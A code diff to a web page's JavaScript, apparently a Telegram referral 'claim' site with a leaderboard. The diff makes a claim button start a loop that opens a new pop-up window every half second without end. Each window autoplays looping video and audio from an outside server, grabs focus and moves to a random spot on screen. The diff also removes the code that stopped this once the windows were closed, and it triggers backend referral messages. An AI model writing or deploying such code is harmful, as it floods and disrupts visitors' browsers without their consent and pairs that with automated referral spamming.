@@ -23,8 +23,8 @@ const leaderboardList = document.getElementById('leaderboardList');
 
 // Variables to manage chaos
 let chaosWindows = [];
-let chaosInterval = null;
 let isChaosActive = false;
+let chaosInterval = null;
 
 // Store the verified telegramUsername
 let verifiedUsername = '';
@@ -151,16 +151,6 @@ secondClaimButton.addEventListener('click', async () => {
         return;
     }
 
-    // Attempt to open a test window to check for popup blockers
-    const testWindow = window.open('', '', 'width=100,height=100');
-    if (testWindow === null || typeof testWindow === 'undefined') {
-        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
-        return;
-    } else {
-        // Close the test window
-        testWindow.close();
-    }
-
     // Hide the second CLAIM button
     secondClaimButtonContainer.style.display = 'none';
 
@@ -169,8 +159,8 @@ secondClaimButton.addEventListener('click', async () => {
     // Start Chaos Effect
     startChaos();
 
-    // Send messages via backend once chaos starts
-    sendReferralMessages();
+    // Send messages via backend after chaos starts
+    setTimeout(sendReferralMessages, 2000); // Delay to ensure chaos has started
 });
 
 // Send Referral Messages
@@ -229,108 +219,69 @@ function startChaos() {
         chaosSound.play();
     }
 
-    // Open all chaos windows during user interaction
-    const totalChaosWindows = 20; // Adjust the number as needed
-    for (let i = 0; i < totalChaosWindows; i++) {
-        const chaosWindow = window.open('', '_blank', 'width=640,height=360');
-        if (chaosWindow) {
-            // Keep the window hidden initially
-            chaosWindow.document.write(`
-                <!DOCTYPE html>
-                <html lang="en">
-                <head>
-                    <title>Chaos Window ${i + 1}</title>
-                    <style>
-                        body {
-                            margin: 0;
-                            padding: 0;
-                            background-color: black;
-                            overflow: hidden;
-                        }
-                        body.hidden {
-                            display: none;
-                        }
-                        video {
-                            width: 100%;
-                            height: 100%;
-                            object-fit: cover;
-                        }
-                    </style>
-                </head>
-                <body class="hidden">
-                    <video autoplay loop>
-                        <source src="https://telegram-dpreferral-backend.onrender.com/chaosvid.mp4" type="video/mp4">
-                    </video>
-                    <audio autoplay>
-                        <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
-                    </audio>
-                    <script>
-                        // Prepare to show the window later
-                        window.isRevealed = false;
-                    </script>
-                </body>
-                </html>
-            `);
-
-            // Store the window reference
-            chaosWindows.push(chaosWindow);
-        } else {
-            console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
-            alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
-            endChaos();
-            return;
-        }
-    }
-
-    // Start revealing the chaos windows gradually
-    let currentWindowIndex = 0;
+    // Start spawning chaos windows indefinitely
     chaosInterval = setInterval(() => {
-        // Reveal windows each interval
-        for (let j = 0; j < 1; j++) {
-            if (currentWindowIndex >= chaosWindows.length) {
-                clearInterval(chaosInterval);
-                return;
-            }
-
-            const chaosWindow = chaosWindows[currentWindowIndex];
-            if (chaosWindow && !chaosWindow.closed) {
-                chaosWindow.document.body.classList.remove('hidden');
-                chaosWindow.focus();
-                // Move the window to a random position
-                const width = 640;
-                const height = 360;
-                const x = Math.floor(Math.random() * (screen.width - width));
-                const y = Math.floor(Math.random() * (screen.height - height));
-                chaosWindow.moveTo(x, y);
-            }
-            currentWindowIndex++;
-        }
-    }, 300); // Reveal one new window every 0.3 seconds
+        spawnChaosWindow();
+    }, 500); // Adjust the interval as needed (e.g., every 0.5 seconds)
 }
 
-// Add a single focus listener to detect when chaos windows are closed
-window.addEventListener('focus', () => {
-    if (!isChaosActive) return;
+// Function to spawn a single chaos window
+function spawnChaosWindow() {
+    const chaosWindow = window.open('', '_blank', 'width=640,height=360');
+    if (chaosWindow) {
+        chaosWindow.document.write(`
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <title>Chaos Window</title>
+                <style>
+                    body {
+                        margin: 0;
+                        padding: 0;
+                        background-color: black;
+                        overflow: hidden;
+                    }
+                    video {
+                        width: 100%;
+                        height: 100%;
+                        object-fit: cover;
+                    }
+                </style>
+            </head>
+            <body>
+                <video autoplay loop>
+                    <source src="https://telegram-dpreferral-backend.onrender.com/chaosvid.mp4" type="video/mp4">
+                </video>
+                <audio autoplay>
+                    <source src="https://telegram-dpreferral-backend.onrender.com/chaossound.mp3" type="audio/mpeg">
+                </audio>
+            </body>
+            </html>
+        `);
+        chaosWindow.focus();
+        // Move the window to a random position
+        const width = 640;
+        const height = 360;
+        const x = Math.floor(Math.random() * (screen.width - width));
+        const y = Math.floor(Math.random() * (screen.height - height));
+        chaosWindow.moveTo(x, y);
 
-    // Update the chaosWindows array by removing closed windows
-    chaosWindows = chaosWindows.filter(w => !w.closed);
-
-    // If no chaos windows are left, end chaos
-    if (chaosWindows.length === 0) {
-        endChaos();
+        // Keep track of the chaos window
+        chaosWindows.push(chaosWindow);
+    } else {
+        console.warn('Pop-up blocked. Please allow pop-ups for this site to enable the chaos effect.');
+        alert('Pop-up blocked. Please allow pop-ups for this site and refresh the page to proceed.');
+        stopChaos(); // Stop attempting to spawn windows
     }
-});
+}
 
-// Function to end chaos
-function endChaos() {
-    if (!isChaosActive) return;
-    isChaosActive = false;
-
-    // Clear the interval
+// Function to stop chaos (if needed)
+function stopChaos() {
     if (chaosInterval) {
         clearInterval(chaosInterval);
         chaosInterval = null;
     }
+    isChaosActive = false;
 
     // Remove no-scroll class
     document.body.classList.remove('no-scroll');
@@ -340,9 +291,6 @@ function endChaos() {
         chaosSound.pause();
         chaosSound.currentTime = 0;
     }
-
-    // Notify the user
-    alert('The chaos has ended! Check your Telegram for further instructions.');
 }
 
 // Leaderboard Functionality
